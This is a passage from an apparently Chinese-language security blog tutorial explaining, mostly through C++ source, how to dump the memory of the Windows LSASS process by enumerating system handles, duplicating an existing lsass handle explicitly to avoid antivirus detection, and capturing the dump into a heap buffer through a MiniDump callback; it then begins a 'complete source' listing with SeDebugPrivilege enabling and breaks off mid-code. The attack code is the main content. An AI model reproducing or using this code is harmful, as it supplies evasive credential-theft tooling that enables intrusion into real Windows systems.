<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">PVOID SysInfo;</span><br><span class="line">PSYSTEM_HANDLE_INFORMATION HandleInfo;</span><br><span class="line">ULONG ReturnLength = <span class="number">0</span>;</span><br><span class="line">NTSTATUS status;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((status = <span class="built_in">NtQuerySystemInformation</span>(</span><br><span class="line">	SystemHandleInformation,</span><br><span class="line">	HandleInfo,</span><br><span class="line">	ReturnLength,</span><br><span class="line">	&amp;ReturnLength</span><br><span class="line">)) == STATUS_INFO_LENGTH_MISMATCH)</span><br><span class="line">	HandleInfo = (PSYSTEM_HANDLE_INFORMATION)<span class="built_in">realloc</span>(HandleInfo, ReturnLength *= <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;NtQuerySystemInformation Failed:%u\r\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;NtQuerySystemInformation Failed:%u\r\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    <strong>筛选进程句柄</strong></p>
<p>用到的结构体</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_HANDLE</span> &#123;</span></span><br><span class="line">	ULONG ProcessId;<span class="comment">//进程id</span></span><br><span class="line">	BYTE ObjectTypeNumber;</span><br><span class="line">	BYTE Flags;</span><br><span class="line">	USHORT Handle;	<span class="comment">//句柄的USHOT形式，若要使用，可利用(Void*)进行强转</span></span><br><span class="line">	PVOID Object;</span><br><span class="line">	ACCESS_MASK GrantedAccess;</span><br><span class="line">&#125; SYSTEM_HANDLE, * PSYSTEM_HANDLE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">OBJECT_TYPE_INFORMATION</span> &#123;</span></span><br><span class="line">	UNICODE_STRING TypeName;	<span class="comment">//获得该对象的类型名的UNICODE_STRING</span></span><br><span class="line">	ULONG TotalNumberOfObjects;</span><br><span class="line">	ULONG TotalNumberOfHandles;</span><br><span class="line">	ULONG TotalPagedPoolUsage;</span><br><span class="line">	ULONG TotalNonPagedPoolUsage;</span><br><span class="line">	ULONG TotalNamePoolUsage;</span><br><span class="line">	ULONG TotalHandleTableUsage;</span><br><span class="line">	ULONG HighWaterNumberOfObjects;</span><br><span class="line">	ULONG HighWaterNumberOfHandles;</span><br><span class="line">	ULONG HighWaterPagedPoolUsage;</span><br><span class="line">	ULONG HighWaterNonPagedPoolUsage;</span><br><span class="line">	ULONG HighWaterNamePoolUsage;</span><br><span class="line">	ULONG HighWaterHandleTableUsage;</span><br><span class="line">	ULONG InvalidAttributes;</span><br><span class="line">	GENERIC_MAPPING GenericMapping;</span><br><span class="line">	ULONG ValidAccessMask;</span><br><span class="line">	BOOLEAN SecurityRequired;</span><br><span class="line">	BOOLEAN MaintainHandleCount;</span><br><span class="line">	UCHAR TypeIndex;</span><br><span class="line">	CHAR Reserved;</span><br><span class="line">	ULONG PoolType;</span><br><span class="line">	ULONG DefaultPagedPoolCharge;</span><br><span class="line">	ULONG DefaultNonPagedPoolCharge;</span><br><span class="line">&#125; OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>​    利用for循环,遍历存储于<code>SYSTEM_HANDLE_INFORMATION</code>结构中的句柄信息，使用<code>OpenProcess</code>打开一个具有<code>PROCESS_DUP_HANDLE</code>、<code>PROCESS_QUERY_LIMITED_INFORMATION</code>权限的进程句柄，为避免杀软检测，我们并不能直接使用系统中存在的这份句柄，我们需要使用<code>NtDuplicateObject</code>函数copy一份该进程的句柄以供我们使用。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">SYSTEM_HANDLE sysHandle;</span><br><span class="line">HANDLE hProcess=<span class="literal">NULL</span>, Duplitehandle=<span class="literal">NULL</span>,targetHandle=<span class="literal">NULL</span>;</span><br><span class="line">NTSTATUS status;</span><br><span class="line">POBJECT_TYPE_INFORMATION objectTypeInfo;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> index=<span class="number">1</span>; index &lt; HandleInfo-&gt;HandleCount; index++) &#123;</span><br><span class="line">		<span class="comment">//printf(&quot;Handle ProcessId:%d\r\n&quot;, HandleInfo-&gt;Handles[index].ProcessId);</span></span><br><span class="line">		<span class="keyword">if</span> (HandleInfo-&gt;Handles[index].ProcessId == <span class="number">4</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		sysHandle = HandleInfo-&gt;Handles[index];</span><br><span class="line">		hProcess = <span class="built_in">OpenProcess</span>(PROCESS_DUP_HANDLE|PROCESS_QUERY_LIMITED_INFORMATION, <span class="literal">false</span>, sysHandle.ProcessId);</span><br><span class="line">		<span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//try to copy handle</span></span><br><span class="line">		status = <span class="built_in">NtDuplicateObject</span>(hProcess, (<span class="keyword">void</span>*)sysHandle.Handle,<span class="built_in">GetCurrentProcess</span>(), &amp;Duplitehandle, PROCESS_VM_READ|PROCESS_QUERY_INFORMATION, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">			<span class="comment">/*printf(&quot;DupliteHandle Failed of the pid:%d\r\n&quot;, sysHandle.ProcessId);*/</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//Query handle info</span></span><br><span class="line">        ReturnLength = <span class="number">0</span>; <span class="comment">//Reset ReturnLength</span></span><br><span class="line">		<span class="keyword">while</span> ((status = <span class="built_in">NtQueryObject</span>(</span><br><span class="line">			Duplitehandle,</span><br><span class="line">			ObjectTypeInformation,</span><br><span class="line">			objectTypeInfo,</span><br><span class="line">			ReturnLength,</span><br><span class="line">			&amp;ReturnLength)) == STATUS_INFO_LENGTH_MISMATCH) &#123;</span><br><span class="line">			objectTypeInfo = (POBJECT_TYPE_INFORMATION)<span class="built_in">realloc</span>(objectTypeInfo, ReturnLength * <span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!objectTypeInfo) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;could not get the handle information\r\n&quot;</span>);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">wchar_t</span> path[<span class="number">255</span>];</span><br><span class="line"> </span><br><span class="line">		DWORD buffSize = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>​    此处我们使用<code>wcscmp</code>函数查找ObjectTypeInfo的TypeName.buffer出现<code>Process</code>关键字的句柄，若存在进入下一层判断，利用<code>QueryFullProcessImageName</code>查找进程名等信息，进而使用<code>wcsstr</code>函数查找出现该关键字的进程，并利用<code>targetHandle</code>、<code>ProcessID</code>变量将复制的句柄、<code>lsass</code>进程的PID保存。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">wchar_t</span> path[<span class="number">255</span>];</span><br><span class="line"> </span><br><span class="line">DWORD buffSize = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">wcscmp</span>(<span class="string">L&quot;Process&quot;</span>, objectTypeInfo-&gt;TypeName.Buffer) == <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="comment">//查找进程名等信息</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">QueryFullProcessImageName</span>(Duplitehandle, <span class="number">0</span>, path, &amp;buffSize)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;QueryFullProcessImagenameW Failed,ErrorCode:%d\r\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">wcsstr</span>(path,<span class="string">L&quot;lsass&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;[+] Found the Process Handle ,%d\r\n&quot;</span>, sysHandle.ProcessId);</span><br><span class="line">			targetHandle = Duplitehandle;</span><br><span class="line">			ProcessID = sysHandle.ProcessId;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    <strong>MiniDumpCallBack</strong></p>
<p>​    触发回调之后，通过<code>RtlCopyMemory</code>将<code>Lsass</code>进程内的内容存到堆指针dumpBuffer所指向的堆空间当中；触发回调函数时，利用全局变量<code>bytesRead</code>获得我们已转储的lsass进程内存内容的大小，利用<code>callbackInput-&gt;Io.Offset</code>以及<code>callbackInput-&gt;Io.BufferBytes</code>获取每次我们读取内存内容的开始位置以及大小。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//Apply for the Buffer for saving Lsass dump file</span></span><br><span class="line">LPVOID dumpBuffer = <span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">70</span>); <span class="comment">//Alloction 70m</span></span><br><span class="line">DWORD bytesRead = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL CALLBACK <span class="title">minidumpCallback</span><span class="params">(__in PVOID callbackParam,__in <span class="keyword">const</span> PMINIDUMP_CALLBACK_INPUT callbackInput,__inout PMINIDUMP_CALLBACK_OUTPUT callbackOutput)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LPVOID Destination=<span class="number">0</span>, Source=<span class="number">0</span>;</span><br><span class="line">	DWORD bufferSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (callbackInput-&gt;CallbackType)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="comment">//Triggering Write CallbackFunc</span></span><br><span class="line">	<span class="keyword">case</span> IoStartCallback:</span><br><span class="line">		callbackOutput-&gt;Status = S_FALSE;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> IoWriteAllCallback:</span><br><span class="line">		callbackOutput-&gt;Status = S_OK;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//抓取触发回调后 读取lsass 要被dump的内存内容</span></span><br><span class="line">		Source = callbackInput-&gt;Io.Buffer;</span><br><span class="line">		<span class="comment">//计算存储这部分内容的位置  堆的基地址+lsass转储内存内容的开始偏移</span></span><br><span class="line">		Destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput-&gt;Io.Offset);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//上面被读取的小块内容的大小</span></span><br><span class="line">		bufferSize = callbackInput-&gt;Io.BufferBytes;</span><br><span class="line">		bytesRead += bufferSize;</span><br><span class="line">		<span class="comment">//向堆中写入lsass的小块内容</span></span><br><span class="line">		<span class="built_in">RtlCopyMemory</span>(Destination, Source, bufferSize);</span><br><span class="line">		<span class="comment">//printf(&quot;[+]Minidump offset %x,content length:%x\r\n&quot;, callbackInput-&gt;Io.Offset, callbackInput-&gt;Io.BufferBytes);</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Io.Offset %x\r\n&quot;</span>, callbackInput-&gt;Io.Offset);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> IoFinishCallback:</span><br><span class="line">		callbackOutput-&gt;Status = S_OK;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="0x004完整源码"><a href="#0x004完整源码" class="headerlink" title="0x004完整源码:"></a>0x004完整源码:</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ProcessSnapshot.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;DbgHelp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_INFO_LENGTH_MISMATCH 0xc0000004</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_SUCCESS(x) ((x) &gt;= 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib, <span class="meta-string">&quot;crypt32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib, <span class="meta-string">&quot;advapi32&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib, <span class="meta-string">&quot;kernel32&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib,<span class="meta-string">&quot;Dbghelp.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">SYSTEM_INFORMATION_CLASS</span> &#123;</span></span><br><span class="line">	SystemBasicInformation = <span class="number">0</span>,</span><br><span class="line">	SystemProcessorInformation = <span class="number">1</span>,</span><br><span class="line">	SystemPerformanceInformation = <span class="number">2</span>,</span><br><span class="line">	SystemTimeOfDayInformation = <span class="number">3</span>,</span><br><span class="line">	SystemPathInformation = <span class="number">4</span>,</span><br><span class="line">	SystemProcessInformation = <span class="number">5</span>,</span><br><span class="line">	SystemCallCountInformation = <span class="number">6</span>,</span><br><span class="line">	SystemDeviceInformation = <span class="number">7</span>,</span><br><span class="line">	SystemProcessorPerformanceInformation = <span class="number">8</span>,</span><br><span class="line">	SystemFlagsInformation = <span class="number">9</span>,</span><br><span class="line">	SystemCallTimeInformation = <span class="number">10</span>,</span><br><span class="line">	SystemModuleInformation = <span class="number">11</span>,</span><br><span class="line">	SystemLocksInformation = <span class="number">12</span>,</span><br><span class="line">	SystemStackTraceInformation = <span class="number">13</span>,</span><br><span class="line">	SystemPagedPoolInformation = <span class="number">14</span>,</span><br><span class="line">	SystemNonPagedPoolInformation = <span class="number">15</span>,</span><br><span class="line">	SystemHandleInformation = <span class="number">16</span>,</span><br><span class="line">	SystemObjectInformation = <span class="number">17</span>,</span><br><span class="line">	SystemPageFileInformation = <span class="number">18</span>,</span><br><span class="line">	SystemVdmInstemulInformation = <span class="number">19</span>,</span><br><span class="line">	SystemVdmBopInformation = <span class="number">20</span>,</span><br><span class="line">	SystemFileCacheInformation = <span class="number">21</span>,</span><br><span class="line">	SystemPoolTagInformation = <span class="number">22</span>,</span><br><span class="line">	SystemInterruptInformation = <span class="number">23</span>,</span><br><span class="line">	SystemDpcBehaviorInformation = <span class="number">24</span>,</span><br><span class="line">	SystemFullMemoryInformation = <span class="number">25</span>,</span><br><span class="line">	SystemLoadGdiDriverInformation = <span class="number">26</span>,</span><br><span class="line">	SystemUnloadGdiDriverInformation = <span class="number">27</span>,</span><br><span class="line">	SystemTimeAdjustmentInformation = <span class="number">28</span>,</span><br><span class="line">	SystemSummaryMemoryInformation = <span class="number">29</span>,</span><br><span class="line">	SystemNextEventIdInformation = <span class="number">30</span>,</span><br><span class="line">	SystemEventIdsInformation = <span class="number">31</span>,</span><br><span class="line">	SystemCrashDumpInformation = <span class="number">32</span>,</span><br><span class="line">	SystemExceptionInformation = <span class="number">33</span>,</span><br><span class="line">	SystemCrashDumpStateInformation = <span class="number">34</span>,</span><br><span class="line">	SystemKernelDebuggerInformation = <span class="number">35</span>,</span><br><span class="line">	SystemContextSwitchInformation = <span class="number">36</span>,</span><br><span class="line">	SystemRegistryQuotaInformation = <span class="number">37</span>,</span><br><span class="line">	SystemExtendServiceTableInformation = <span class="number">38</span>,</span><br><span class="line">	SystemPrioritySeperation = <span class="number">39</span>,</span><br><span class="line">	SystemVerifierAddDriverInformation = <span class="number">40</span>,</span><br><span class="line">	SystemVerifierRemoveDriverInformation = <span class="number">41</span>,</span><br><span class="line">	SystemProcessorIdleInformation = <span class="number">42</span>,</span><br><span class="line">	SystemLegacyDriverInformation = <span class="number">43</span>,</span><br><span class="line">	SystemCurrentTimeZoneInformation = <span class="number">44</span>,</span><br><span class="line">	SystemLookasideInformation = <span class="number">45</span>,</span><br><span class="line">	SystemTimeSlipNotification = <span class="number">46</span>,</span><br><span class="line">	SystemSessionCreate = <span class="number">47</span>,</span><br><span class="line">	SystemSessionDetach = <span class="number">48</span>,</span><br><span class="line">	SystemSessionInformation = <span class="number">49</span>,</span><br><span class="line">	SystemRangeStartInformation = <span class="number">50</span>,</span><br><span class="line">	SystemVerifierInformation = <span class="number">51</span>,</span><br><span class="line">	SystemVerifierThunkExtend = <span class="number">52</span>,</span><br><span class="line">	SystemSessionProcessInformation = <span class="number">53</span>,</span><br><span class="line">	SystemLoadGdiDriverInSystemSpace = <span class="number">54</span>,</span><br><span class="line">	SystemNumaProcessorMap = <span class="number">55</span>,</span><br><span class="line">	SystemPrefetcherInformation = <span class="number">56</span>,</span><br><span class="line">	SystemExtendedProcessInformation = <span class="number">57</span>,</span><br><span class="line">	SystemRecommendedSharedDataAlignment = <span class="number">58</span>,</span><br><span class="line">	SystemComPlusPackage = <span class="number">59</span>,</span><br><span class="line">	SystemNumaAvailableMemory = <span class="number">60</span>,</span><br><span class="line">	SystemProcessorPowerInformation = <span class="number">61</span>,</span><br><span class="line">	SystemEmulationBasicInformation = <span class="number">62</span>,</span><br><span class="line">	SystemEmulationProcessorInformation = <span class="number">63</span>,</span><br><span class="line">	SystemExtendedHandleInformation = <span class="number">64</span>,</span><br><span class="line">	SystemLostDelayedWriteInformation = <span class="number">65</span>,</span><br><span class="line">	SystemBigPoolInformation = <span class="number">66</span>,</span><br><span class="line">	SystemSessionPoolTagInformation = <span class="number">67</span>,</span><br><span class="line">	SystemSessionMappedViewInformation = <span class="number">68</span>,</span><br><span class="line">	SystemHotpatchInformation = <span class="number">69</span>,</span><br><span class="line">	SystemObjectSecurityMode = <span class="number">70</span>,</span><br><span class="line">	SystemWatchdogTimerHandler = <span class="number">71</span>,</span><br><span class="line">	SystemWatchdogTimerInformation = <span class="number">72</span>,</span><br><span class="line">	SystemLogicalProcessorInformation = <span class="number">73</span>,</span><br><span class="line">	SystemWow64SharedInformationObsolete = <span class="number">74</span>,</span><br><span class="line">	SystemRegisterFirmwareTableInformationHandler = <span class="number">75</span>,</span><br><span class="line">	SystemFirmwareTableInformation = <span class="number">76</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS, * PSYSTEM_INFORMATION_CLASS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> LONG KPRIORITY;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">	ULONG NextEntryOffset;</span><br><span class="line">	ULONG NumberOfThreads;</span><br><span class="line">	BYTE Reserved1[<span class="number">48</span>];</span><br><span class="line">	UNICODE_STRING ImageName;</span><br><span class="line">	KPRIORITY BasePriority;</span><br><span class="line">	HANDLE UniqueProcessId;</span><br><span class="line">	PVOID Reserved2;</span><br><span class="line">	ULONG HandleCount;</span><br><span class="line">	ULONG SessionId;</span><br><span class="line">	PVOID Reserved3;</span><br><span class="line">	SIZE_T PeakVirtualSize;</span><br><span class="line">	SIZE_T VirtualSize;</span><br><span class="line">	ULONG Reserved4;</span><br><span class="line">	SIZE_T PeakWorkingSetSize;</span><br><span class="line">	SIZE_T WorkingSetSize;</span><br><span class="line">	PVOID Reserved5;</span><br><span class="line">	SIZE_T QuotaPagedPoolUsage;</span><br><span class="line">	PVOID Reserved6;</span><br><span class="line">	SIZE_T QuotaNonPagedPoolUsage;</span><br><span class="line">	SIZE_T PagefileUsage;</span><br><span class="line">	SIZE_T PeakPagefileUsage;</span><br><span class="line">	SIZE_T PrivatePageCount;</span><br><span class="line">	LARGE_INTEGER Reserved7[<span class="number">6</span>];</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_HANDLE</span> &#123;</span></span><br><span class="line">	ULONG ProcessId;</span><br><span class="line">	BYTE ObjectTypeNumber;</span><br><span class="line">	BYTE Flags;</span><br><span class="line">	USHORT Handle;</span><br><span class="line">	PVOID Object;</span><br><span class="line">	ACCESS_MASK GrantedAccess;</span><br><span class="line">&#125; SYSTEM_HANDLE, * PSYSTEM_HANDLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_HANDLE_INFORMATION</span> &#123;</span></span><br><span class="line">	ULONG HandleCount;</span><br><span class="line">	SYSTEM_HANDLE Handles[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">OBJECT_INFORMATION_CLASS</span> &#123;</span></span><br><span class="line">	ObjectBasicInformation, </span><br><span class="line">	ObjectNameInformation, </span><br><span class="line">	ObjectTypeInformation, </span><br><span class="line">	ObjectAllTypesInformation,</span><br><span class="line">	ObjectHandleInformation, </span><br><span class="line"></span><br><span class="line">	ObjectTypesInformation, </span><br><span class="line">	ObjectDataInformation</span><br><span class="line">&#125;OBJECT_INFORMATION_CLASS, * POBJECT_INFORMATION_CLASS;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(NTAPI* pNtQueryObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	IN OPTIONAL  HANDLE                   Handle,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN           OBJECT_INFORMATION_CLASS ObjectInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT OPTIONAL PVOID                    ObjectInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN            ULONG                    ObjectInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT OPTIONAL PULONG                   ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(NTAPI* pNtQuerySystemInformation)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	IN          SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN OUT      PVOID                    SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN          ULONG                    SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT OPTIONAL PULONG                   ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">OBJECT_TYPE_INFORMATION</span> &#123;</span></span><br><span class="line">	UNICODE_STRING TypeName;</span><br><span class="line">	ULONG TotalNumberOfObjects;</span><br><span class="line">	ULONG TotalNumberOfHandles;</span><br><span class="line">	ULONG TotalPagedPoolUsage;</span><br><span class="line">	ULONG TotalNonPagedPoolUsage;</span><br><span class="line">	ULONG TotalNamePoolUsage;</span><br><span class="line">	ULONG TotalHandleTableUsage;</span><br><span class="line">	ULONG HighWaterNumberOfObjects;</span><br><span class="line">	ULONG HighWaterNumberOfHandles;</span><br><span class="line">	ULONG HighWaterPagedPoolUsage;</span><br><span class="line">	ULONG HighWaterNonPagedPoolUsage;</span><br><span class="line">	ULONG HighWaterNamePoolUsage;</span><br><span class="line">	ULONG HighWaterHandleTableUsage;</span><br><span class="line">	ULONG InvalidAttributes;</span><br><span class="line">	GENERIC_MAPPING GenericMapping;</span><br><span class="line">	ULONG ValidAccessMask;</span><br><span class="line">	BOOLEAN SecurityRequired;</span><br><span class="line">	BOOLEAN MaintainHandleCount;</span><br><span class="line">	UCHAR TypeIndex;</span><br><span class="line">	CHAR Reserved;</span><br><span class="line">	ULONG PoolType;</span><br><span class="line">	ULONG DefaultPagedPoolCharge;</span><br><span class="line">	ULONG DefaultNonPagedPoolCharge;</span><br><span class="line">&#125; OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pNtDuplicateObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE SourceProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE SourceHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE TargetProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE TargetHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG Attributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG Options</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(NTAPI* pRtlAdjustPrivilege)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG    Privilege,</span></span></span><br><span class="line"><span class="params"><span class="function">	BOOLEAN  Enable,</span></span></span><br><span class="line"><span class="params"><span class="function">	BOOLEAN  CurrentThread,</span></span></span><br><span class="line"><span class="params"><span class="function">	PBOOLEAN Enabled</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Apply for the Buffer for saving Lsass dump file</span></span><br><span class="line">LPVOID dumpBuffer = <span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">70</span>); <span class="comment">//Alloction 70m</span></span><br><span class="line">DWORD bytesRead = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">FindProcHandle</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">EnableSeDebugPrivilege</span><span class="params">(BOOL fEnable, HANDLE&amp; hToken)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	BOOLEAN enabled;</span><br><span class="line">	<span class="keyword">if</span> (RtlAdjustPrivilege == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Not Found pRtlAdjustPrivilege Func，ErrorCode:%u\r\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	HANDLE hToken = <span class="literal">NULL</span>, PrimaryToken = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">EnableSeDebugPrivilege</span>(<span class="literal">true</span>, hToken))</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;SeDebugPrivilege 